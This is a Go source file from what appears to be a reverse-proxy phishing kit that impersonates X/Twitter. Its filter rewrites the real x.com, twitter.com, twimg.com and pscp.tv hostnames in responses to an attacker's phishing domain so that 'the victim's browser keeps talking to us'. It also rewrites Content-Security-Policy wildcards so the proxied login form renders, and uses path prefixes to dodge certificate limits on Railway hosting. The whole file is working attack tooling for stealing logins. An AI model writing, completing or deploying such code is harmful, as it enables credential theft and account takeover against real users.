package main

import (
	"bytes"
	"fmt"
	"regexp"
	"sort"
	"strings"
)

// subFilter rewrites occurrences of the real X/Twitter hostnames in response
// bodies and headers to the phishing domain, so the victim's browser keeps
// talking to us instead of the real x.com.
type subFilter struct {
	cfg *config

	// wildcardRe caches the compiled regexp used to collapse remaining CSP
	// wildcard/port host-sources (built lazily in wildcardRE).
	wildcardRe *regexp.Regexp
}

func newSubFilter(cfg *config) *subFilter {
	return &subFilter{cfg: cfg}
}

// rewrite replaces real hostnames with the phishing domain in the body.
// Replacements are applied longest-first so "https://x.com" is handled before
// the bare "x.com" substring.
func (f *subFilter) rewrite(body []byte) []byte {
	return f.rewriteFor(body, f.cfg.phishDomain)
}

// rewriteFor replaces real hostnames with the given phishing host. This is the
// per-request form: the host is normally taken from the victim's Host header so
// the proxy works even when no PHISH_DOMAIN env var is configured (e.g. on
// Railway, where the public domain is not exposed to the container).
//
// The rewrite is done in two passes via a placeholder token so that the
// path-prefix scheme cannot double-substitute: for a subdomain host h the
// target is "<phish>/_xrp/<h>", which still *contains* the literal h. A naive
// single-pass ReplaceAll of the bare "h" would then re-match the h embedded in
// its own replacement and corrupt the output ("<phish>/_xrp/<phish>/_xrp/<h>").
func (f *subFilter) rewriteFor(body []byte, phish string) []byte {
	if len(body) == 0 || phish == "" {
		return body
	}

	repls := f.replacements(phish)
	out := body

	// Pass 0: collapse wildcard/port host-sources BEFORE the concrete rules
	// run. X's live CSP uses double-label wildcards (https://*.cdn.x.com,
	// https://*.video.pscp.tv), host:port forms (https://x.com:443), and
	// wildcard-port forms (wss://localhost.x.com:*) that the concrete rules
	// either miss entirely or corrupt (e.g. the bare-host rule rewrites
	// "*.video.pscp.tv" into "*.<phish>/_xrp/video.pscp.tv", and the
	// "h:" rule turns "x.com:443" into "<phish>:443"). By collapsing these
	// to "scheme://<phish>" FIRST — while the real origin hostnames are still
	// intact — none of those malformed forms can survive.
	out = f.collapseWildcards(out, phish)

	// Pass 1: swap each real host (every from-variant) for a unique placeholder
	// token that contains no hostname characters, so nothing can re-match.
	for i, r := range repls {
		tok := placeholder(i)
		out = bytes.ReplaceAll(out, []byte(r.from), tok)
	}

	// Pass 2: swap each placeholder back to its target phish-domain string.
	for i, r := range repls {
		out = bytes.ReplaceAll(out, placeholder(i), []byte(r.to))
	}

	return out
}

// wildcardRegex matches any remaining CSP host-source that references a real
// X/Twitter origin through a wildcard or port form that the concrete rules
// miss. It is built once and cached; it matches:
//
//	https://*.twimg.com          (single-label wildcard)
//	https://*.cdn.x.com          (double-label wildcard)
//	https://x.com:443            (explicit port)
//	wss://localhost.x.com:*      (wildcard port on a subdomain)
//
// and collapses each to "scheme://<phish>".
func (f *subFilter) collapseWildcards(body []byte, phish string) []byte {
	re := f.wildcardRE()
	if re == nil {
		return body
	}
	// ReplaceFunc lets us preserve the scheme (https/http/ws/wss///) of each
	// matched source while dropping the host portion entirely.
	return re.ReplaceAllFunc(body, func(m []byte) []byte {
		mm := string(m)
		scheme := "https://"
		switch {
		case strings.HasPrefix(mm, "wss://"):
			scheme = "wss://"
		case strings.HasPrefix(mm, "ws://"):
			scheme = "ws://"
		case strings.HasPrefix(mm, "http://"):
			scheme = "http://"
		case strings.HasPrefix(mm, "//"):
			scheme = "//"
		}
		return []byte(scheme + phish)
	})
}

// wildcardRE builds (and caches on the filter) a regexp that matches host-source
// wildcards and port forms for every origin. It returns nil when there are no
// origins to match.
func (f *subFilter) wildcardRE() *regexp.Regexp {
	if f.wildcardRe != nil {
		return f.wildcardRe
	}
	if len(f.cfg.origins) == 0 {
		return nil
	}
	// Escape each origin for use inside a regexp, and join with "|".
	parts := make([]string, 0, len(f.cfg.origins))
	for _, o := range f.cfg.origins {
		parts = append(parts, regexp.QuoteMeta(o))
	}
	originAlt := strings.Join(parts, "|")

	// Match: (scheme) *.<one-or-more-labels><origin>(:<port-or-*>)
	// e.g. https://*.x.com, https://*.cdn.x.com, wss://*.video.pscp.tv,
	//      https://x.com:443, wss://localhost.x.com:*
	// Note the host itself is captured but discarded; only the scheme matters.
	//
	// CRITICAL: this must NOT match a concrete bare subdomain like
	// https://api.x.com. Those are handled by the concrete rules in
	// replacements(), which produce the "<phish>/_xrp/api.x.com" path-prefix
	// form. If this regexp swallows a concrete host, it collapses it to the
	// bare "<phish>" and loses the /_xrp/ routing prefix. So we require EITHER
	// the "*." wildcard prefix (alternative 1) OR a ":<port>" suffix
	// (alternative 2) — a bare host with neither is left alone for the
	// concrete rules to rewrite.
	pattern := `(wss:|ws:|https:|http:|//)(\*\.)[a-z0-9.-]+\.(?:` + originAlt + `)(:[0-9*]+)?` +
		`|(wss:|ws:|https:|http:|//)[a-z0-9.-]+\.(?:` + originAlt + `):[0-9*]+`

	re, err := regexp.Compile(pattern)
	if err != nil {
		return nil
	}
	f.wildcardRe = re
	return re
}

// placeholder returns a unique byte token for replacement index i. The token
// uses control characters that never appear in URLs, HTML, or header values, so
// it cannot collide with real hostname text nor be re-matched by another rule.
func placeholder(i int) []byte {
	// \x01 (SOH) delimits the token; the index is encoded as 4 ASCII digits so
	// token N is never a prefix of token N+1 (which would break ReplaceAll).
	b := []byte{0x01}
	b = append(b, []byte(fmt.Sprintf("%04d", i))...)
	return append(b, 0x01)
}

// rewriteString is a convenience wrapper for header values.
func (f *subFilter) rewriteString(s string) string {
	return f.rewriteStringFor(s, f.cfg.phishDomain)
}

// rewriteStringFor is the per-request string form.
func (f *subFilter) rewriteStringFor(s, phish string) string {
	return string(f.rewriteFor([]byte(s), phish))
}

type replacement struct{ from, to string }

// replacements returns an ordered (longest-first) list of hostname rewrites.
func (f *subFilter) replacements(phish string) []replacement {

	// Collect every host variant we need to scrub. X/Twitter serve the SPA and
	// its data from many subdomains; all of them must map back to the phish
	// host so the victim's browser keeps talking to us. We list the known
	// subdomains explicitly AND add a wildcard fallback below so any future
	// subdomain (e.g. jf.x.com) still resolves to the phish host instead of a
	// bogus "prefix.<phish>" string.
	fromSet := map[string]bool{}
	for _, origin := range f.cfg.origins {
		hosts := []string{
			origin,
			"www." + origin,
			"api." + origin,
			"abs." + origin,
			"mobile." + origin,
			"static." + origin,
			"help." + origin,
			"support." + origin,
			// X API / data / onboarding subdomains the SPA talks to directly.
			"jf." + origin,      // JetFuel onboarding (jf.x.com)
			"upload." + origin,  // upload.x.com
			"chat-ws." + origin, // chat-ws.x.com
			"watch." + origin,   // watch.x.com
			"analytics." + origin,
			"pbs." + origin,     // pbs.twimg.com (media)
			"video." + origin,   // video.twimg.com
			"ton." + origin,     // ton.x.com
			"x-money." + origin, // x-money.x.com
			"studio." + origin,  // studio.x.com
			"studio-dev." + origin,
			"platform." + origin, // platform.x.com
		}
		for _, h := range hosts {
			fromSet[h] = true
		}
	}

	// Build all from->to pairs. Each host maps to a phish-domain equivalent using
	// the "_xrp" path-prefix scheme (see rewriteHost), so a single TLS cert for
	// the bare phish host covers everything:
	//
	//   x.com        -> <phish>                        (SPA HTML / API root)
	//   api.x.com    -> <phish>/_xrp/api.x.com         (API)
	//   jf.x.com     -> <phish>/_xrp/jf.x.com          (onboarding)
	//   abs.twimg.com-> <phish>/_xrp/abs.twimg.com     (JS bundle / CDN)
	//   pbs.twimg.com-> <phish>/_xrp/pbs.twimg.com     (media)
	//
	// resolveTarget detects the /_xrp/<host> prefix, extracts the embedded host,
	// strips the prefix, and routes to that upstream. The bare origin
	// (x.com/twitter.com/twimg.com/pscp.tv) maps to the bare phish host.
	var out []replacement
	for h := range fromSet {
		to := f.rewriteHost(h, phish)
		// Fully-qualified URL forms.
		out = append(out,
			replacement{"https://" + h, "https://" + to},
			replacement{"http://" + h, "http://" + to},
			replacement{"wss://" + h, "wss://" + to},
			replacement{"ws://" + h, "ws://" + to},
			replacement{"//" + h, "//" + to},
			replacement{"\"" + h + "\"", "\"" + to + "\""},
			replacement{"'" + h + "'", "'" + to + "'"},
			replacement{h + "/", to + "/"},
			replacement{h + ":", to + ":"},
			replacement{"." + h, "." + to},
			replacement{"@" + h, "@" + to},
			replacement{h, to},
		)
	}

	// CSP wildcard sources. X's Content-Security-Policy uses host-source
	// patterns like "https://*.twimg.com", "https://*.x.com",
	// "wss://*.x.com", etc. Those "*." prefixes are NOT matched by the rules
	// above (the rules only cover concrete hosts and ".host" forms), so the
	// rewritten CSP would still whitelist the REAL x.com/twimg.com and the
	// browser would block our proxied JS bundle — exactly the "login form
	// renders then vanishes" bug (the SPA fails to hydrate and unmounts the
	// server-rendered form). Collapse every "*.<origin>" wildcard to the bare
	// phish host: all our proxied subdomains are same-origin under <phish>/_xrp/.
	for _, origin := range f.cfg.origins {
		wild := "*." + origin
		out = append(out,
			replacement{"https://" + wild, "https://" + phish},
			replacement{"http://" + wild, "http://" + phish},
			replacement{"wss://" + wild, "wss://" + phish},
			replacement{"ws://" + wild, "ws://" + phish},
			replacement{"//" + wild, "//" + phish},
			replacement{wild, phish},
		)
	}

	// Sort longest-from first so shorter substrings don't clobber longer ones.
	sort.Slice(out, func(i, j int) bool {
		return len(out[i].from) > len(out[j].from)
	})
	return out
}

// rewriteHost maps a single origin/subdomain host to its phish-domain
// equivalent. We use the "_xrp" PATH-PREFIX scheme (not subdomains) so that a
// single TLS certificate for the bare phish domain covers every asset. This is
// the only approach that works on Railway, whose edge provides a wildcard cert
// for *.up.railway.app (one label) but NOT for abs.*.up.railway.app (two
// labels), which would produce ERR_CERT_COMMON_NAME_INVALID.
//
//	x.com         -> <phish>                        (SPA HTML / API root)
//	twitter.com   -> <phish>
//	abs.twimg.com -> <phish>/_xrp/abs.twimg.com     (JS bundle / CDN)
//	api.x.com     -> <phish>/_xrp/api.x.com         (API)
//	pbs.twimg.com -> <phish>/_xrp/pbs.twimg.com     (media)
//
// resolveTarget detects the /_xrp/<host> prefix, extracts the embedded host,
// strips the prefix, and routes to that upstream.
func (f *subFilter) rewriteHost(h, phish string) string {
	base := baseOriginFor(f.cfg.origins, h)
	if base == "" || base == h {
		// Bare origin (x.com, twitter.com, twimg.com, pscp.tv) -> bare phish.
		return phish
	}
	// Anything with a subdomain (abs.twimg.com, api.x.com, ...) -> path-prefixed.
	return phish + "/_xrp/" + h
}

// baseOriginFor is a pure helper so it can be unit-tested without a config.
func baseOriginFor(origins []string, h string) string {
	best := ""
	for _, o := range origins {
		if h == o || strings.HasSuffix(h, "."+o) {
			if len(o) > len(best) {
				best = o
			}
		}
	}
	return best
}
